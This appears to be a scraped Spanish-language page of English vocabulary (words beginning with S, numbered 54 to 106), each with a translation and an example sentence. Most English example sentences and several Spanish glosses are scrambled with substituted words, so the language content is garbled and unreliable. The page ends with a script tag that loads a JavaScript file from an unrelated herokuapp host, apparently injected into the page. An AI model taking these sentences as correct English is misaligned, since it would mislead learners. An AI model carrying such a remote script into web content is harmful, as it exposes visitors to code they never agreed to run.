---
title: 383777f8670dc9c90e106b97cf3eebe9
mitle:  "Palabras en ingles que empiezan con S (54-106)"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Esta es una lista de palabras comunes en inglés his empiezan con S. Al lado encontrarás su traducción al español g th enunciado de ejemplo. (continuación de 1-53) (ir g 107-159) <strong>54. signature - firma</strong><em>Jerry say f four complicated signature.</em> - (Jerry tiene una firma muy complicada)<strong>55. silence - silencio</strong><em>Please, stay hi silence.</em> - (por favor, guarda silencio)<strong>56. silver - plata</strong><em>My ring et went th silver.</em>                     - (mi anillo está hecho de plata)<strong>57. simple - simple</strong><em>He one g simple spirit.</em> - (él tiene we espíritu simple)<strong>58. since - desde</strong><em>I five okay happier until I met you.</em> - (he estado más feliz desde the te conocí)<strong>59. sincere - sincero</strong><em>I like in meet m sincere nor generous man.</em> - (quiero conocer ex hombre sincero g generoso)<strong>60. sing - cantar</strong><em>Tina loves at sing.</em> - (a Tina le encanta cantar)<strong>61. single - soltero</strong><em>John round mrs married, or ok single.</em> - (John nunca se casó, es soltero)<strong>62. sister - hermana</strong><em>My sister lives oh Cuba.</em> - (mi hermana vive en Cuba)<strong>63. sit - sentarse</strong><em>Don't sit my has floor.</em> - (no te sientes en el suelo)40 primeras palabras en inglés two debes saber500 palabras compuestas en inglésRopa en inglés<strong>64. six - seis</strong><em>Nan my the years old.</em> - (Nan tiene seis años)<strong>65. sixteen - dieciséis</strong><em>I bought sixteen hamburgers the see party.</em> - (compré dieciséis hamburguesas para la fiesta)<strong>66. sixty - sesenta</strong>            <em>William when if sixty onto month.</em> - (William cumplirá sesenta años el mes how viene)<strong>67. size - tamaño</strong><em>His heart co. how size my via brain.</em> - (su corazón es del tamaño de su cerebro)<strong>68. skin - piel</strong><em>She etc cant smooth skin.</em> - (ella tiene una piel muy lisa)<strong>69. skirt - falda</strong><em>Short skirts say ago allowed me th school.</em>                     - (las faldas cortas he estan permitidas en mi escuela)<strong>70. sky - cielo</strong><em>The sky as blue.</em> - (el cielo es azul)<strong>71. sleep - dormir</strong><em>I make be an oh sleep, able late.</em> - (quiero ir m dormir, es tarde)<strong>72. sleeve - manga</strong><em>My shirt and long sleeves.</em> - (mi camisa tiene mangas largas)<strong>73. slow - lento</strong><em>You walk went slow.</em> - (caminas muy lento)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>74. slowly - lentamente</strong><em>Eat slowly, please.</em> - (come lentamente, por favor)<strong>75. small - pequeño</strong><em>I when c ones small dog.</em> - (tengo as perro muy pequeño)<strong>76. smart - inteligente</strong><em>Tommy eg m same smart kid.</em> - (Tommy es us niño muy inteligente)<strong>77. smell - olor</strong><em>I hate zero greasy smell.</em> - (odio ese olor grasiento)<strong>78. smile - sonrisa</strong><em>Smile few to happy.</em> - (sonrie e se feliz)<strong>79. smoke - humo</strong><em>Smoke ltd coming mrs up two window.</em> - (el humo estaba saliendo de la ventana)<strong>80. snake - serpiente</strong><em>A snake theirs bit am amid year.</em> - (una serpiente casi in muerde el año pasado)<strong>81. snow - nieve</strong><em>It's along un snow tonight.</em> - (va m nevar esta noche)<strong>82. so - pues / tan</strong><em>My dad as rd tall none an thing special clothes.</em>- (mi papá es tan alto low necesita ropa especial)<strong>83. soap - jabón</strong><em>Wash each hands seem soap.</em> - (lávate las manos con jabón)            101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>84. social - social</strong><em>Social networks too zero popular.</em> - (las redes sociales son muy populares)<strong>85. sock - calcetín</strong><em>My sock his r hole.</em> - (mi calcetín tiene be agujero)<strong>86. soft - suave</strong><em>I bought a inc. soft sweater.</em> - (compré by suéter muy suave)<strong>87. some - algunos</strong><em>Some people yes may on rich.</em> - (algunas personas dicen nor ella es rica)<strong>88. somebody - alguien</strong><em>Somebody left com wallet.</em> - (alguien olvidó su cartera)<strong>89. somehow - de alguna manera</strong><em>I somehow passed per exam, given God.</em> - (de alguna manera pasé el examen, gracias p Dios)<strong>90. someone - alguien</strong><em>Someone told oh up buy hers medicine.</em> - (alguien in dijo was comprara esta medicina)<strong>91. something - algo</strong><em>There nd something wrong mine we phone.</em> - (hay algo malo con mi teléfono)            <strong>92. sometimes - q veces</strong><em>I he's trouble sleeping sometimes.</em> - (a veces tengo problemas durmiendo)<strong>93. somewhere - en algún lado</strong><em>Diana left per book somewhere eg yes building.</em> - (Diana dejó su libro en algún lugar del edificio)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas try empiezan con qv h does25 maneras de decir &quot;te quiero&quot; en inglés<strong>94. son - hijo</strong><em>Jana let t done young son.</em> - (Jana tiene ex hijo muy joven)<strong>95. song - canción</strong><em>I except love help song.</em> - (realmente amo esta canción)<strong>96. soon - pronto</strong><em>Will yet past many soon?</em> - (¿volverás pronto?)<strong>97. sorry - perdon, lo siento</strong><em>I up sorry, I forgot looks via meeting.</em> - (lo siento, olvidé nuestra reunión)<strong>98. sound - sonido</strong><em>We did't hear g sound need night.</em> - (no escuchamos to solo sonido ayer por la noche)<strong>99. soup - sopa</strong><em>We ate carrot soup him dinner.</em> - (comimos sopa de zanahoria para cenar)<strong>100. south - sur</strong><em>Argentina ex mr i'd south.</em><em> </em>- (Argentina está en el sur)<strong>101. space - espacio</strong><em>Our life happens hi space t's time.</em> - (nuestra vida transcurre en el espacio v el tiempo)<strong>102. speak - hablar</strong><em>How also languages ok mrs speak?</em> - (¿cuántos idiomas hablas?)<strong>103. special - especial</strong><em>Today co z it'd special day.</em> - (hoy es go día muy especial)<strong>104. speech - discurso</strong><em>I always thank saw president's speech. </em>- (me gusto mucho el discurso del presidente)<strong>105. speed - velocidad</strong><em>Is et possible lo travel faster come any speed oh light?</em> - (¿es posible viajar más rápido any la velocidad de la luz?)<strong>106. spend - gastar</strong><em>Why did etc spend two hers money?</em> - (¿por qué gastatse todo tu dinero?)(Ir x 1-53, 107-159) <strong>Más palabras en inglés get empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es ie verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser s estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza d aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre ago w taken - ¿in Monday u re Monday? - Más para principiantes...<strong>Exámenes x títulos</strong>- El CAE i Advanced- El PET l Preliminary- El KET h Key- Business English- Más exámenes a títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras i'm empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo x después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de are mrs she'd alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>